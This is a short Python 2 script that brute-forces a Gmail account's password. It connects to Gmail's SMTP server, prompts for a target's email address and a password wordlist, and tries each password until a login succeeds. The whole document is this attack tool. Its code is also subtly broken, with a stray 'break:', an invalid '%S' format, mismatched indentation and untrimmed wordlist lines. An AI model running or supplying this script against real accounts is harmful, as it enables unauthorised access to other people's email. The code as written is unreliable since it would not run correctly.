import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com" , 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter the target's email address: ")
passwfile = raw_input("Enter the password file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
        try: 
               smtpserver.login(user, password)
               print "[+] password Found %S" % password
               break:
         except smtplib.SMTPAuthenticationError:
                print "[!] password Incorrect: %S" % password
